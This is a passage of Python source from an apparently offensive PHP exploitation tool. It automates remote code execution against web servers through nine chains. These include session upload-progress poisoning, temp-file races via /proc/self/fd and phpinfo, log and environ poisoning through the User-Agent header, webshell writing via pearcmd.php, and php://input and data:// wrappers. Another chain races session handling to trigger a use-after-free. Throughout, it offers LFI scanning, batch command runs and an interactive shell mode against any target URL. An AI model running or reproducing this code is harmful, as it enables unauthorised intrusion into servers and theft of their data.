            gadgets.append((fw, gen))
    if not any(fw == "laravel" for fw, _ in gadgets):
        for gen in GADGET_MAP["laravel"]:
            gadgets.append(("laravel (blind)", gen))

    if not gadgets:
        log.info("    No gadgets available")
        http.close()
        return None

    session_pages = _find_session_pages(base_url, http)
    if not session_pages:
        upload_eps = find_upload_endpoints(base_url, proxy, threads=10)
        session_pages = upload_eps if upload_eps else [f"{base_url}/"]
    log.info(f"    Session trigger pages: {len(session_pages)}")

    wrapped_cmd = b64_system_cmd(cmd)

    for fw_name, gadget_gen in gadgets:
        log.info(f"    Trying gadget: {fw_name} / {gadget_gen.__name__}")

        result = gadget_gen(wrapped_cmd)
        if isinstance(result, tuple):
            gadget_bytes, shell_path = result
        else:
            gadget_bytes = result
            shell_path = None

        for page_url in session_pages:
            sid = rand_sid()
            inject_value = b"|" + gadget_bytes

            try:
                http.cookies.clear()
                http.cookies.set("PHPSESSID", sid)
                http.post(
                    page_url,
                    files=[
                        ("PHP_SESSION_UPLOAD_PROGRESS", (None, inject_value)),
                        ("file", ("blob", io.BytesIO(b"\x00" * 4096), "application/octet-stream")),
                    ],
                    timeout=15, allow_redirects=True,
                )
            except requests.RequestException:
                continue

            try:
                r = http.get(page_url, timeout=15, allow_redirects=True)
            except requests.RequestException:
                continue

            output = extract_output(r.text)
            if output and output.strip():
                http.close()
                return output.strip()

            if "uid=" in r.text and "gid=" in r.text:
                m = re.search(r"(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^\n]*)", r.text)
                if m:
                    http.close()
                    return m.group(1)

            if shell_path and lfi_url and lfi_param:
                parsed = urlparse(lfi_url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[lfi_param] = [shell_path]
                shell_trigger = urlunparse(parsed._replace(
                    query=urlencode(qs, doseq=True)))
                try:
                    r2 = http.get(shell_trigger, timeout=10)
                    out = extract_output(r2.text)
                    if out and out.strip():
                        http.close()
                        return out.strip()
                except requests.RequestException:
                    pass

    http.close()
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 3 — /proc/self/fd Temp File Race
# ═══════════════════════════════════════════════════════════════════════════

def exploit_tmpfile(base_url, cmd, lfi_url, lfi_param, proxy=None,
                    threads=10, attempts=80):
    """
    Uploads a large file with PHP payload and races to include it via
    /proc/self/fd/N or /proc/<pid>/fd/N before PHP cleans up the temp file.
    Works on Linux with /proc filesystem accessible.
    Two modes: cross-process (/proc/<pid>/fd) for FPM, same-process for mod_php.
    """
    payload = b64_payload(cmd)
    large_payload = (payload.encode() + b"\n") * 50
    result_box = []
    stop = threading.Event()
    worker_pids = []

    log.info(f"[*] Chain 3: /proc/self/fd race ({threads} threads, {attempts} attempts)")

    parsed = urlparse(lfi_url)
    qs_base = parse_qs(parsed.query, keep_blank_values=True)

    def _discover_pids():
        h = make_http(proxy)
        qs = dict(qs_base)
        qs[lfi_param] = ["/proc/self/status"]
        url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            r = h.get(url, timeout=5)
            m = re.search(r"Pid:\s*(\d+)", r.text)
            if m:
                my_pid = int(m.group(1))
                for offset in range(-8, 9):
                    p = my_pid + offset
                    if p > 1:
                        worker_pids.append(p)
        except requests.RequestException:
            pass
        h.close()

    _discover_pids()
    if worker_pids:
        log.info(f"    Discovered FPM PID range: {min(worker_pids)}-{max(worker_pids)}")

    def upload_loop():
        h = make_http(proxy)
        while not stop.is_set():
            try:
                h.post(f"{base_url}/", files={
                    "file": ("p.php", io.BytesIO(large_payload),
                             "application/octet-stream"),
                }, timeout=10, allow_redirects=True)
            except requests.RequestException:
                pass
        h.close()

    def include_loop():
        h = make_http(proxy)
        fd_range = list(range(3, 50))
        pid_prefixes = ["/proc/self"]
        for pid in worker_pids:
            pid_prefixes.append(f"/proc/{pid}")

        for _ in range(attempts):
            if stop.is_set():
                break
            for prefix in pid_prefixes:
                if stop.is_set():
                    break
                for fd in fd_range:
                    if stop.is_set():
                        break
                    qs = dict(qs_base)
                    qs[lfi_param] = [f"{prefix}/fd/{fd}"]
                    trigger = urlunparse(parsed._replace(
                        query=urlencode(qs, doseq=True)))
                    try:
                        r = h.get(trigger, timeout=3)
                        out = extract_output(r.text)
                        if out and out.strip():
                            result_box.append(out.strip())
                            stop.set()
                            h.close()
                            return
                    except requests.RequestException:
                        pass
        h.close()

    uploaders = [threading.Thread(target=upload_loop, daemon=True)
                 for _ in range(max(1, threads - 1))]
    for t in uploaders:
        t.start()

    includer = threading.Thread(target=include_loop, daemon=True)
    includer.start()
    includer.join(timeout=90)
    stop.set()
    for t in uploaders:
        t.join(timeout=2)

    return result_box[0] if result_box else None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 4 — phpinfo() Temp File Leak
# ═══════════════════════════════════════════════════════════════════════════

def exploit_phpinfo(base_url, cmd, phpinfo_url, lfi_url, lfi_param,
                    proxy=None, attempts=150, threads=5):
    """
    Insomnia Security technique: upload a file to phpinfo() page, extract
    the temp filename from $_FILES output while the response streams,
    then race to include it via LFI before cleanup.
    Multi-threaded: concurrent phpinfo uploads + rapid LFI includes.
    """
    payload = b64_payload(cmd)
    result_box = []
    stop = threading.Event()
    tmp_queue = []
    tmp_lock = threading.Lock()

    log.info(f"[*] Chain 4: phpinfo race ({attempts} attempts, {threads} threads)")

    def phpinfo_upload():
        h = make_http(proxy)
        pad = "A" * 8192
        for _ in range(attempts):
            if stop.is_set():
                break
            try:
                r = h.post(
                    phpinfo_url,
                    files={"file": ("p.php", payload.encode(), "application/octet-stream")},
                    data={"padding": pad, "extra": "B" * 8192,
                          "pad2": "C" * 8192, "pad3": "D" * 8192},
                    headers={
                        "Cookie": "PHPSESSID=" + rand_sid() + "; pad=" + "E" * 4096,
                        "Accept": "F" * 4096,
                        "Accept-Language": "G" * 4096,
                    },
                    timeout=15,
                    stream=True,
                )

                partial = b""
                for chunk in r.iter_content(chunk_size=4096):
                    partial += chunk
                    text = partial.decode("utf-8", errors="ignore")
                    m = re.search(
                        r'\[tmp_name\][^/\\]*((?:/tmp/php|/var/tmp/php|C:\\Windows\\Temp\\php)[A-Za-z0-9.]+)',
                        text,
                    )
                    if m:
                        with tmp_lock:
                            tmp_queue.append(m.group(1))
                        break
                r.close()
            except Exception:
                continue
        h.close()

    def lfi_trigger():
        h = make_http(proxy)
        parsed = urlparse(lfi_url)
        qs_base = parse_qs(parsed.query, keep_blank_values=True)
        while not stop.is_set():
            tmp_path = None
            with tmp_lock:
                if tmp_queue:
                    tmp_path = tmp_queue.pop(0)
            if not tmp_path:
                time.sleep(0.01)
                continue
            qs = dict(qs_base)
            qs[lfi_param] = [tmp_path]
            trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            try:
                r = h.get(trigger, timeout=5)
                output = extract_output(r.text)
                if output and output.strip():
                    result_box.append(output.strip())
                    stop.set()
                    h.close()
                    return
            except requests.RequestException:
                pass
        h.close()

    uploaders = [threading.Thread(target=phpinfo_upload, daemon=True)
                 for _ in range(max(1, threads))]
    for t in uploaders:
        t.start()

    trigger_threads = [threading.Thread(target=lfi_trigger, daemon=True)
                       for _ in range(2)]
    for t in trigger_threads:
        t.start()

    for t in uploaders:
        t.join(timeout=120)
    stop.set()
    for t in trigger_threads:
        t.join(timeout=5)

    return result_box[0] if result_box else None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 5 — Log Poisoning
# ═══════════════════════════════════════════════════════════════════════════

def exploit_log_poison(base_url, cmd, lfi_url, lfi_param, proxy=None):
    """
    Injects PHP code into the User-Agent header, which lands in web server
    access/error logs, then includes the log file via LFI.
    """
    http = make_http(proxy)
    payload = b64_payload(cmd)

    log.info("[*] Chain 5: Log poisoning — checking readable logs ...")

    readable_logs = []
    parsed = urlparse(lfi_url)
    qs_base = parse_qs(parsed.query, keep_blank_values=True)

    for log_path in LOG_PATHS:
        qs = dict(qs_base)
        qs[lfi_param] = [log_path]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            r = http.get(test_url, timeout=5)
            if r.status_code < 400 and len(r.text) > 50:
                if any(sig in r.text for sig in ["GET ", "POST ", "HTTP/", "[error",
                                                  "[notice", "DOCUMENT_ROOT"]):
                    readable_logs.append(log_path)
                    log.info(f"    Readable: {log_path}")
        except requests.RequestException:
            pass

    if not readable_logs:
        http.close()
        log.info("    No readable log files found")
        return None

    log.info(f"    Poisoning {len(readable_logs)} log(s) via User-Agent ...")
    try:
        http2 = make_http(proxy)
        http2.headers["User-Agent"] = payload
        http2.get(f"{base_url}/p2s_poison_{rand_sid(6)}.php", timeout=5)
        http2.close()
    except requests.RequestException:
        pass

    time.sleep(0.5)

    for log_path in readable_logs:
        qs = dict(qs_base)
        qs[lfi_param] = [log_path]
        trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            r = http.get(trigger, timeout=15)
            output = extract_output(r.text)
            if output and output.strip():
                http.close()
                return output.strip()
        except requests.RequestException:
            pass

    http.close()
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 6 — PEARCMD.php
# ═══════════════════════════════════════════════════════════════════════════

def exploit_pearcmd(base_url, cmd, lfi_url, lfi_param, proxy=None):
    """
    Exploits pearcmd.php (present in Docker PHP images) to write a webshell
    via config-create or man_dir methods, then includes it via LFI.
    Requires register_argc_argv = On in php.ini.
    """
    http = make_http(proxy)
    log.info("[*] Chain 6: PEARCMD.php exploitation")

    shell_path = f"/tmp/p2s_{rand_sid(8)}.php"
    enc = base64.b64encode(cmd.encode()).decode()
    shell_code = f'<?php echo "{MARKER_S}";echo shell_exec(base64_decode("{enc}"));echo "{MARKER_E}";?>'

    parsed = urlparse(lfi_url)
    qs_base = parse_qs(parsed.query, keep_blank_values=True)

    for pearcmd in PEARCMD_PATHS:
        qs = dict(qs_base)
        qs[lfi_param] = [pearcmd]
        base_trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

        config_url = f"{base_trigger}&+config-create+/&/{quote(shell_code, safe='')}+{shell_path}"
        try:
            prep = requests.Request("GET", config_url).prepare()
            prep.url = f"{base_trigger}&+config-create+/&/{shell_code}+{shell_path}"
            r = http.send(prep, timeout=10)
        except requests.RequestException:
            try:
                r = http.get(config_url, timeout=10)
            except requests.RequestException:
                continue

        qs2 = dict(qs_base)
        qs2[lfi_param] = [shell_path]
        shell_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
        try:
            r2 = http.get(shell_url, timeout=10)
            output = extract_output(r2.text)
            if output and output.strip():
                http.close()
                return output.strip()
        except requests.RequestException:
            pass

        man_url_raw = f"{base_trigger}&+-c+{shell_path}+-d+man_dir={shell_code}+-s+"
        try:
            prep = requests.Request("GET", man_url_raw).prepare()
            prep.url = man_url_raw
            r = http.send(prep, timeout=10)
        except requests.RequestException:
            continue

        try:
            r2 = http.get(shell_url, timeout=10)
            output = extract_output(r2.text)
            if output and output.strip():
                http.close()
                return output.strip()
        except requests.RequestException:
            pass

    http.close()
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 7 — /proc/self/environ
# ═══════════════════════════════════════════════════════════════════════════

def exploit_environ(base_url, cmd, lfi_url, lfi_param, proxy=None, sapi=None):
    """
    Injects PHP code in the User-Agent header and includes /proc/self/environ
    via LFI. The environ file contains HTTP_USER_AGENT with our payload.
    Linux only. Works with mod_php/CGI — NOT with PHP-FPM (env vars differ).
    """
    http = make_http(proxy)
    payload = b64_payload(cmd)
    log.info("[*] Chain 7: /proc/self/environ injection")

    if sapi and "fpm" in sapi.lower():
        log.info("    Note: FPM detected — environ may not contain HTTP headers")

    parsed = urlparse(lfi_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[lfi_param] = ["/proc/self/environ"]
    trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    try:
        r = http.get(trigger, headers={"User-Agent": payload}, timeout=10)
        output = extract_output(r.text)
        if output and output.strip():
            http.close()
            return output.strip()
    except requests.RequestException:
        pass

    http.close()
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 8 — PHP Wrappers (php://input, data://)
# ═══════════════════════════════════════════════════════════════════════════

def exploit_wrappers(base_url, cmd, lfi_url, lfi_param, proxy=None):
    """
    Uses php://input or data:// wrappers for direct code execution via LFI.
    Requires allow_url_include = On (disabled by default in production).
    """
    http = make_http(proxy)
    payload = b64_payload(cmd)
    log.info("[*] Chain 8: PHP stream wrappers")

    parsed = urlparse(lfi_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    qs[lfi_param] = ["php://input"]
    trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    try:
        r = http.post(trigger, data=payload.encode(), timeout=10)
        output = extract_output(r.text)
        if output and output.strip():
            http.close()
            return output.strip()
    except requests.RequestException:
        pass

    enc = base64.b64encode(payload.encode()).decode()
    qs[lfi_param] = [f"data://text/plain;base64,{enc}"]
    trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    try:
        r = http.get(trigger, timeout=10)
        output = extract_output(r.text)
        if output and output.strip():
            http.close()
            return output.strip()
    except requests.RequestException:
        pass

    http.close()
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 9 — Concurrent UAF Disturbance (Session Destroy/Regen/GC Race)
# ═══════════════════════════════════════════════════════════════════════════

DISTURB_MODES = ["destroy", "regenerate", "gc"]

def exploit_uaf_disturbance(base_url, cmd, session_pages, upload_eps,
                            session_paths, lfi_url=None, lfi_param=None,
                            proxy=None, threads=10, rounds=50):
    """
    Exploits CVE-2026-109618 core mechanism: sends a throttled multipart
    upload to keep session.upload_progress active while concurrent requests
    disturb the session (destroy/regenerate/gc). This triggers the heap UAF
    on the dangling zval pointers in the progress HashTable.

    Technique from slabbdev/php2shell race harness and ikow chain analysis.
    Three disturbance modes:
      - destroy: concurrent session_destroy() frees the session HashTable
      - regenerate: session_regenerate_id() reallocates session storage
      - gc: force session garbage collection with low gc_maxlifetime
    """
    log.info(f"[*] Chain 9: Concurrent UAF Disturbance ({rounds} rounds)")
    payload = b64_payload(cmd)
    result_box = []
    stop = threading.Event()

    for spath in session_paths:
        if stop.is_set():
            break
        for inject_ep in upload_eps:
            if stop.is_set():
                break

            for mode in DISTURB_MODES:
                if stop.is_set():
                    break
                sid = rand_sid()
                sess_file = f"{spath}/sess_{sid}"
                log.info(f"    Mode: {mode} | SID: {sid} | Path: {spath}")

                def slow_upload(n):
                    http = make_http(proxy)
                    http.cookies.set("PHPSESSID", sid)
                    for _ in range(n):
                        if stop.is_set():
                            break
                        try:
                            http.post(inject_ep,
                                data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                                files={"file": ("blob",
                                         io.BytesIO(b"\x00" * 16384),
                                         "application/octet-stream")},
                                timeout=30, allow_redirects=True)
                        except requests.RequestException:
                            pass
                    http.close()

                def disturb(n):
                    http = make_http(proxy)
                    http.cookies.set("PHPSESSID", sid)
                    for _ in range(n):
                        if stop.is_set():
                            break
                        for page_url in session_pages:
                            try:
                                if mode == "destroy":
                                    http.get(page_url, params={"action": "destroy"},
                                             timeout=5)
                                elif mode == "regenerate":
                                    http.get(page_url, params={"action": "regenerate"},
                                             timeout=5)
                                elif mode == "gc":
                                    http.get(page_url, params={"action": "gc"},
                                             timeout=5)
                            except requests.RequestException:
                                pass
                    http.close()

                def check_crash():
                    """Check if the race caused a worker crash (502/503)."""
                    http = make_http(proxy)
                    try:
                        r = http.get(f"{base_url}/", timeout=5)
                        if r.status_code in (502, 503):
                            log.warning(f"    [!] CRASH SIGNAL: HTTP {r.status_code}")
                            return True
                    except (requests.ConnectionError, requests.Timeout):
                        log.warning("    [!] CRASH SIGNAL: Connection failed")
                        return True
                    except requests.RequestException:
                        pass
                    finally:
                        http.close()
                    return False

                upload_threads = []
                for _ in range(max(2, threads // 3)):
                    t = threading.Thread(target=slow_upload, args=(rounds,))
                    t.daemon = True
                    t.start()
                    upload_threads.append(t)

                disturb_threads = []
                for _ in range(max(2, threads // 3)):
                    t = threading.Thread(target=disturb, args=(rounds,))
                    t.daemon = True
                    t.start()
                    disturb_threads.append(t)

                for t in upload_threads + disturb_threads:
                    t.join(timeout=60)

                if check_crash():
                    log.info("    [+] UAF triggered — worker crashed!")
                    if lfi_url and lfi_param:
                        http = make_http(proxy)
                        http.cookies.set("PHPSESSID", sid)
                        http.post(inject_ep,
                            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                            files={"file": ("blob", io.BytesIO(b"\x00" * 4096),
                                     "application/octet-stream")},
                            timeout=15, allow_redirects=True)

                        parsed = urlparse(lfi_url)
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs[lfi_param] = [sess_file]
                        trigger = urlunparse(parsed._replace(
                            query=urlencode(qs, doseq=True)))
                        try:
                            r = http.get(trigger, timeout=15)
                            output = extract_output(r.text)
                            if output and output.strip():
                                http.close()
                                return output.strip()
                        except requests.RequestException:
                            pass
                        http.close()

                    result_box.append(f"UAF_CRASH:{mode}:{sid}")

    if result_box:
        return result_box[0]
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  AUTO MODE — Multi-Chain Orchestrator
# ═══════════════════════════════════════════════════════════════════════════

def auto_exploit(base_url, cmd, proxy=None, race=False, threads=15,
                 attempts=200, chain=None):
    """
    Full auto mode — tries all 9 chains in order of reliability.
    Order: Recon → Deser(2) → LFI scan → Session(1) → UAF(9) → Log(5) →
           Environ(7) → PEARCMD(6) → Wrappers(8) → phpinfo(4) → tmpfile(3)
    """
    log.info("=" * 60)
    log.info("[*] AUTO MODE — 9-Chain Multi-Vector Exploitation")
    log.info("=" * 60)
    print()

    # ── Step 0: Session Fixation Check ──────────────────────────────────
    fixation = check_session_fixation(base_url, proxy)
    if fixation is True:
        log.info("[+] Session fixation: Server accepts arbitrary SIDs")
    elif fixation is False:
        log.warning("[!] Session fixation: Strict mode — server rejects supplied SIDs")
    else:
        log.info("[*] Session fixation: Could not determine (assuming permissive)")
    print()

    # ── Step 1: Recon ────────────────────────────────────────────────────
    log.info("[STEP 1/9] Reconnaissance")
    info = recon(base_url, proxy)
    if not info["reachable"]:
        log.error("[-] Target not reachable.")
        return None
    print_recon(info)

    if info.get("cleanup") is True and not race:
        log.warning("[!] cleanup=On detected — auto-enabling race mode for Chain 1")
        race = True
    print()

    # ── Step 2: Framework Detection ──────────────────────────────────────
    log.info("[STEP 2/9] Framework Detection")
    http = make_http(proxy)
    frameworks = detect_framework(base_url, http)
    http.close()
    if frameworks:
        log.info(f"    Detected: {', '.join(frameworks)}")
    else:
        log.info("    No specific framework detected (will try generic gadgets)")
    print()

    # ── Step 3: Chain 2 — Deserialization (no LFI needed) ────────────────
    if chain in (None, 2):
        log.info("[STEP 3/9] Chain 2 — Deserialization Gadgets")
        output = exploit_deser(base_url, cmd, frameworks, proxy,
                               lfi_url=None, lfi_param=None)
        if output:
            _rce_success("Chain 2 (Deserialization)", output,
                         frameworks=", ".join(frameworks) or "generic")
            return {"output": output.strip(), "chain": 2,
                    "method": "deserialization"}
        log.info("    Chain 2 unsuccessful")
        print()

    # ── Step 4: LFI Discovery ────────────────────────────────────────────
    lfi_results = []
    if chain in (None, 1, 3, 4, 5, 6, 7, 8, 9):
        log.info("[STEP 4/9] LFI Discovery")
        lfi_results = scan_lfi(base_url, proxy, target_os=info["os"])
        print()

    if not lfi_results and chain not in (None, 2):
        log.error("[-] No LFI found. LFI-dependent chains cannot proceed.")
        return None

    # ── Step 5: Upload Endpoint Discovery ────────────────────────────────
    upload_eps = []
    if lfi_results or chain in (None, 9):
        log.info("[STEP 5/9] Upload Endpoint Discovery")
        upload_eps = find_upload_endpoints(base_url, proxy)
        if not upload_eps:
            log.warning("[!] No upload endpoints found, using base URL")
            upload_eps = [f"{base_url}/"]
        print()

    # ── Step 6: Build session paths ──────────────────────────────────────
    session_paths = []
    if info["session_path"]:
        session_paths.append(info["session_path"])
    if info["os"] == "windows":
        session_paths.extend(SESSION_PATHS_WINDOWS)
        session_paths.extend(SESSION_PATHS_LINUX)
    else:
        session_paths.extend(SESSION_PATHS_LINUX)
        session_paths.extend(SESSION_PATHS_WINDOWS)
    session_paths = list(dict.fromkeys(session_paths))

    # ── Step 7: Try LFI-based chains ────────────────────────────────────
    if lfi_results:
        lfi = lfi_results[0]
        log.info("[STEP 6/9] LFI-Based Exploitation")
        log.info(f"    LFI:  {lfi['param']}= on {urlparse(lfi['url']).path}")
        log.info(f"    Upload endpoints: {len(upload_eps)}")
        log.info(f"    Session paths: {len(session_paths)}")
        print()

        # Chain 1 — Session Poisoning + LFI
        if chain in (None, 1):
            log.info("  [Chain 1] Session Poisoning + LFI")
            for inject_ep in upload_eps:
                for spath in session_paths:
                    log.debug(f"    Inject:{urlparse(inject_ep).path} Session:{spath}")
                    fn = exploit_race if race else exploit
                    kwargs = dict(
                        base_url=base_url, cmd=cmd, session_path=spath,
                        inject_ep=inject_ep, lfi_url=lfi["url"],
                        lfi_param=lfi["param"], proxy=proxy,
                    )
                    if race:
                        kwargs.update(threads=threads, attempts=attempts)
                    output = fn(**kwargs)
                    if output and output.strip():
                        _rce_success("Chain 1 (Session Poisoning + LFI)", output,
                                     lfi=lfi["url"], inject=inject_ep, path=spath)
                        return {"output": output.strip(), "chain": 1,
                                "lfi_url": lfi["url"], "lfi_param": lfi["param"],
                                "inject_ep": inject_ep, "session_path": spath}
            log.info("    Chain 1 unsuccessful")
            print()

        # Chain 9 — Concurrent UAF Disturbance
        if chain in (None, 9):
            log.info("  [Chain 9] Concurrent UAF Disturbance")
            http9 = make_http(proxy)
            session_pages = _find_session_pages(base_url, http9)
            http9.close()
            if session_pages:
                output = exploit_uaf_disturbance(
                    base_url, cmd, session_pages, upload_eps, session_paths,
                    lfi_url=lfi["url"] if lfi_results else None,
                    lfi_param=lfi["param"] if lfi_results else None,
                    proxy=proxy, threads=threads, rounds=min(attempts, 50),
                )
                if output and not output.startswith("UAF_CRASH:"):
                    _rce_success("Chain 9 (UAF Disturbance)", output)
                    return {"output": output.strip(), "chain": 9,
                            "method": "uaf_disturbance"}
                elif output:
                    log.warning(f"    [!] UAF crash confirmed but no RCE: {output}")
            else:
                log.info("    No session-enabled pages found for disturbance")
            log.info("    Chain 9 unsuccessful")
            print()

        # Chain 5 — Log Poisoning
        if chain in (None, 5):
            log.info("  [Chain 5] Log Poisoning")
            output = exploit_log_poison(base_url, cmd, lfi["url"], lfi["param"], proxy)
            if output:
                _rce_success("Chain 5 (Log Poisoning)", output)
                return {"output": output.strip(), "chain": 5, "method": "log_poison"}
            log.info("    Chain 5 unsuccessful")
            print()

        # Chain 7 — /proc/self/environ
        if chain in (None, 7) and info["os"] != "windows":
            log.info("  [Chain 7] /proc/self/environ")
            output = exploit_environ(base_url, cmd, lfi["url"], lfi["param"],
                                     proxy, sapi=info.get("sapi"))
            if output:
                _rce_success("Chain 7 (/proc/self/environ)", output)
                return {"output": output.strip(), "chain": 7, "method": "environ"}
            log.info("    Chain 7 unsuccessful")
            print()

        # Chain 6 — PEARCMD.php
        if chain in (None, 6):
            log.info("  [Chain 6] PEARCMD.php")
            output = exploit_pearcmd(base_url, cmd, lfi["url"], lfi["param"], proxy)
            if output:
                _rce_success("Chain 6 (PEARCMD.php)", output)
                return {"output": output.strip(), "chain": 6, "method": "pearcmd"}
            log.info("    Chain 6 unsuccessful")
            print()

        # Chain 8 — PHP Wrappers
        if chain in (None, 8):
            log.info("  [Chain 8] PHP Wrappers (input/data)")
            output = exploit_wrappers(base_url, cmd, lfi["url"], lfi["param"], proxy)
            if output:
                _rce_success("Chain 8 (PHP Wrappers)", output)
                return {"output": output.strip(), "chain": 8, "method": "wrappers"}
            log.info("    Chain 8 unsuccessful")
            print()

        # Chain 4 — phpinfo() temp file race
        if chain in (None, 4) and info["phpinfo_url"]:
            log.info("  [Chain 4] phpinfo() Temp File Race")
            output = exploit_phpinfo(base_url, cmd, info["phpinfo_url"],
                                     lfi["url"], lfi["param"], proxy)
            if output:
                _rce_success("Chain 4 (phpinfo Race)", output)
                return {"output": output.strip(), "chain": 4, "method": "phpinfo_race"}
            log.info("    Chain 4 unsuccessful")
            print()

        # Chain 3 — /proc/self/fd temp file race
        if chain in (None, 3) and info["os"] != "windows":
            log.info("  [Chain 3] /proc/self/fd Temp File Race")
            output = exploit_tmpfile(base_url, cmd, lfi["url"], lfi["param"],
                                     proxy, threads, attempts)
            if output:
                _rce_success("Chain 3 (/proc/self/fd Race)", output)
                return {"output": output.strip(), "chain": 3, "method": "tmpfile_race"}
            log.info("    Chain 3 unsuccessful")
            print()

    # ── Failed ───────────────────────────────────────────────────────────
    print()
    log.error("[-] All chains exhausted. No RCE achieved.")
    log.error("    Possible reasons:")
    log.error("    - No LFI vulnerability on target")
    log.error("    - upload_progress disabled")
    log.error("    - No exploitable framework for deserialization")
    log.error("    - WAF blocking payloads")
    log.error("    - Session path not in our list")
    log.error("    - cleanup=On without --race mode")
    return None


# ── Command Modes ────────────────────────────────────────────────────────────

def cmd_check(args):
    info = recon(args.target, args.proxy)
    print_recon(info)

    fixation = check_session_fixation(args.target, args.proxy)
    if fixation is True:
        log.info("[+] Session fixation: Accepts arbitrary SIDs (exploitable)")
    elif fixation is False:
        log.warning("[!] Session fixation: Strict mode (rejects supplied SIDs)")
    else:
        log.info("[*] Session fixation: Indeterminate")

    http = make_http(args.proxy)
    frameworks = detect_framework(args.target, http)
    http.close()
    if frameworks:
        log.info(f"[+] Frameworks:       {', '.join(frameworks)}")

    if args.json:
        info["frameworks"] = frameworks
        info["session_fixation"] = fixation
        print(json.dumps(info, indent=2))
    if not info["reachable"]:
        sys.exit(1)


def cmd_scan(args):
    info = recon(args.target, args.proxy)
    if not info["reachable"]:
        log.error("[-] Target not reachable.")
        sys.exit(1)
    print_recon(info)
    print()

    http = make_http(args.proxy)
    frameworks = detect_framework(args.target, http)
    http.close()
    if frameworks:
        log.info(f"[+] Frameworks: {', '.join(frameworks)}")
    print()

    findings = scan_lfi(args.target, args.proxy, target_os=info["os"],
                        threads=args.scan_threads)
    print()

    if findings:
        log.info("[+] LFI Findings:")
        for i, f in enumerate(findings, 1):
            print(f"    {i}. {f['url']}")
            print(f"       Param: {f['param']}, Type: {f['type']}, "
                  f"Evidence: {f['evidence'][:60]}")
    else:
        log.warning("[-] No LFI found.")

    eps = find_upload_endpoints(args.target, args.proxy)
    if eps:
        print()
        log.info("[+] Upload Endpoints:")
        for ep in eps:
            print(f"    - {ep}")

    if args.json:
        print(json.dumps({"lfi": findings, "upload_endpoints": eps,
                          "frameworks": frameworks}, indent=2))


def cmd_auto(args):
    commands = []
    if args.cmds:
        commands = args.cmds
    elif args.cmd_file:
        with open(args.cmd_file) as f:
            commands = [line.strip() for line in f if line.strip()
                        and not line.startswith("#")]
    else:
        commands = [args.cmd]

    chain_arg = None
    if args.chain and args.chain != "all":
        chain_arg = int(args.chain)

    for i, cmd in enumerate(commands):
        if len(commands) > 1:
            log.info(f"\n{'=' * 60}")
            log.info(f"[BATCH {i + 1}/{len(commands)}] {cmd}")
            log.info(f"{'=' * 60}")

        result = auto_exploit(
            args.target, cmd, proxy=args.proxy,
            race=args.race, threads=args.threads,
            attempts=args.attempts, chain=chain_arg,
        )
        if result and args.output:
            with open(args.output, "a") as f:
                entry = {"cmd": cmd, **result}
                f.write(json.dumps(entry, indent=2) + "\n")
            log.info(f"[*] Output appended to {args.output}")


def cmd_manual(args):
    log.info(f"[*] Target:  {args.target}")
    log.info(f"[*] Command: {args.cmd}")

    inject_ep = f"{args.target}{args.inject_endpoint}"
    lfi_url = f"{args.target}{args.lfi_endpoint}?file=test"
    lfi_param = "file"

    if "?" in args.lfi_endpoint:
        parts = args.lfi_endpoint.split("?", 1)
        lfi_url = f"{args.target}{args.lfi_endpoint}"
        if "=" in parts[1]:
            lfi_param = parts[1].split("=")[0]

    fn = exploit_race if args.race else exploit
    kwargs = dict(
        base_url=args.target, cmd=args.cmd, session_path=args.session_path,
        inject_ep=inject_ep, lfi_url=lfi_url, lfi_param=lfi_param,
        proxy=args.proxy,
    )
    if args.race:
        kwargs.update(threads=args.threads, attempts=args.attempts)

    output = fn(**kwargs)
    if output and output.strip():
        log.info("\n\033[92m[+] RCE SUCCESS\033[0m")
        print("=" * 60)
        print(output.strip())
        print("=" * 60)
    else:
        log.error("[-] No output. Run with -v or use auto mode (no --lfi-endpoint)")


def cmd_shell(args):
    log.info(f"[*] Target: {args.target}")

    chain_arg = None
    if args.chain and args.chain != "all":
        chain_arg = int(args.chain)

    if not args.lfi_endpoint:
        log.info("[*] Discovering LFI and endpoints ...")
        info = recon(args.target, args.proxy)
        if not info["reachable"]:
            log.error("[-] Target not reachable.")
            return
        lfi_results = scan_lfi(args.target, args.proxy, target_os=info["os"])
        if not lfi_results:
            log.error("[-] No LFI found. Cannot start shell.")
            return
        upload_eps = find_upload_endpoints(args.target, args.proxy)
        inject_ep = upload_eps[0] if upload_eps else f"{args.target}/"

        paths = [info["session_path"]] if info["session_path"] else []
        paths += SESSION_PATHS_LINUX + SESSION_PATHS_WINDOWS

        lfi = lfi_results[0]
        session_path = None
        for sp in paths:
            out = exploit(args.target, "echo p2s_ok", sp, inject_ep,
                          lfi["url"], lfi["param"], args.proxy)
            if out and "p2s_ok" in out:
                session_path = sp
                break

        if not session_path:
            log.error("[-] Could not find working session path.")
            return

        log.info(f"[+] Shell ready: LFI={lfi['param']}, path={session_path}")
    else:
        inject_ep = f"{args.target}{args.inject_endpoint}"
        lfi = {"url": f"{args.target}{args.lfi_endpoint}?file=test", "param": "file"}
        session_path = args.session_path
        inject_ep = inject_ep if args.inject_endpoint else f"{args.target}/"

    print()
    log.info("[*] Interactive shell. Type 'exit' or Ctrl+C to quit.\n")

